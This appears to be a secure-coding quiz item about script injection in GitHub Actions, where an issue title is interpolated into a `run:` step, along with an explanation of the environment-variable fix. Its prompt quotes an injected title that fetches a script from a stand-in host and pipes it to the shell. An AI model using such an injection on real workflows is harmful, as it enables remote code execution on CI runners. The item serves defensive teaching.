prompt: A malicious issue title of `"; curl evil.sh | sh #` should not be able to hijack this step — but as written it can. Click the vulnerable line.
explanation: Interpolating `github.event.*` straight into `run:` splices attacker text into the shell script itself. The safe shape passes it through an environment variable — `env: TITLE: ${{ github.event.issue.title }}` then `echo "Title: $TITLE"` — so the shell reads a value instead of executing prose.
